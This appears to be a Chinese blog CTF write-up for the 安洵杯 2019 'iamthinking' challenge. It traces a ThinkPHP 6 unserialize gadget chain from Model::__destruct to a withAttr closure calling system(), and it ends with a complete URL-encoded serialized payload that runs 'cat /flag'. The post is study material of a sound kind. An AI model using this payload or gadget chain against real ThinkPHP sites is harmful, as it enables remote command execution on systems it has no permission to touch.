---
title: '[安洵杯 2019]iamthinking'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-06 21:17:56
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-639712.jpg
---
www.zip源码泄露

全局搜索serialize

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/aafafa.jpg)

Index.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/ntmtmdm.jpg)

payload参数可控，接下来就是寻找反序列化的点了。

全局搜索destruct。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201106214057.png)

前面几个都无法利用，所以只能看Model.php
public function __destruct()
{
   if ($this->lazySave) {
   $this->save();
   }
}

其中lazysave没啥用，根据上面代码得知其默认值为false。
跟进save

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201106214838.png)

需要满足isempty()的值为false，trigger('BeforeWrite')的值为true
跟进isEmpty： 
public function isEmpty(): bool
{
   return empty($this->data);
}
所以data变量需不存在。

跟进trigger
在model.php里面没有找到trigger的定义，于是全局搜索trigger。
搜出来一堆但貌似也没有我要找的定义，卡住，看了wp。

看了wp找到了。。。
慢慢找还是能找到的。（爷是懒狗

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201106230526.png)

让$this->withEvent为flase即可。

继续看上面的save()

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201106230957.png)

result需为true
这个exists好像默认值也是true？那么只要updateData()返回true就行。

跟进updataData

然后这里又卡了，这一长串也不知道哪里是切入点。
根据wp提示，继续跟进checkAllowFields。。。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201106233221.png)

发现文字拼接：
$this->table . $this->suffix  
能够被利用触发toString方法。

进入到这一步的条件就是： $this->field为空，且$this->schema也为空。
即: $this->field = []; $this->schema = [];

同时这里还有一个判断，即$this->table，当为true是才能执行字符串的拼接。 
所以为了能让这个方法被调用到，我们要让exists存在。
即 $this->exists =True 

关于toString魔术方法,他是在Conversion.php当中。

public function __toString()
{
   return $this->toJson();
}

继续查看tojson这个函数：

public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
{
   return json_encode($this->toArray(), $options);
}

跟进到toArray方法。

elseif (isset($this->visible[$key])) {
   $item[$key] = $this->getAttr($key);
}
elseif (!isset($this->hidden[$key]) && !$hasVisible) {
   $item[$key] = $this->getAttr($key);
}

再看到getAttr方法：

public function getAttr(string $name)
{
    try {
        $relation = false;
        $value    = $this->getData($name);
    } catch (InvalidArgumentException $e) {
        $relation = $this->isRelationAttr($name);
        $value    = null;
    }

    return $this->getValue($name, $value, $relation);
}

跟进getData方法：

if (is_null($name)) {
        return $this->data;
    }

    $fieldName = $this->getRealFieldName($name);

进入到getRealFieldName方法：

   protected function getRealFieldName(string $name): string
    {
        return $this->strict ? $name : Str::snake($name);
    }
    if (array_key_exists($fieldName, $this->data)) {
        return $this->data[$fieldName];
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }      
如果$this->strict为True，返回$name。

此时再getData方法中：

$this->data[$fielName] = $this->data[$key]

此时再getAttr中就是： $this->getValue($key, $value, null);

跟进getvalue：
protected function getValue(string $name, $value, $relation = false)
{
    // 检测属性获取器
    $fieldName = $this->getRealFieldName($name);
    $method    = 'get' . Str::studly($name) . 'Attr';

    if (isset($this->withAttr[$fieldName])) {
        if ($relation) {
            $value = $this->getRelationValue($relation);
        }

        if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
            $value = $this->getJsonValue($fieldName, $value);
        }else {
            //$fieldName = a
            //withAttr[a] = system
            $closure = $this->withAttr[$fieldName];
            //value = system(ls,)
            $value   = $closure($value, $this->data);
        }

可以很明显看到：

当$this->withAttr[$key]不为数组条件就会为false，从而触发命令执行

其实这题思路一点不难，就是这exp的格式之前没见过。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201107000012.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201107000036.png)

今天来不及细想了，后面一段都是复制的，以后有时间了再看看。
payload:
http://532a6c9f-d826-411b-a479-02b9cc0e1b70.node3.buuoj.cn////public/?payload=O%3A17%3A%22think\model\Pivot%22%3A6%3A{s%3A21%3A%22%00think\Model%00lazySave%22%3Bb%3A1%3Bs%3A8%3A%22%00*%00table%22%3BO%3A17%3A%22think\model\Pivot%22%3A6%3A{s%3A21%3A%22%00think\Model%00lazySave%22%3Bb%3A1%3Bs%3A8%3A%22%00*%00table%22%3Bs%3A0%3A%22%22%3Bs%3A10%3A%22%00*%00visible%22%3Ba%3A1%3A{i%3A0%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}}s%3A21%3A%22%00think\Model%00relation%22%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}s%3A17%3A%22%00think\Model%00data%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B}s%3A21%3A%22%00think\Model%00withAttr%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3B}}s%3A10%3A%22%00*%00visible%22%3Ba%3A1%3A{i%3A0%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}}s%3A21%3A%22%00think\Model%00relation%22%3Ba%3A1%3A{s%3A6%3A%22hu3sky%22%3Bs%3A3%3A%22aaa%22%3B}s%3A17%3A%22%00think\Model%00data%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B}s%3A21%3A%22%00think\Model%00withAttr%22%3Ba%3A1%3A{s%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3B}}
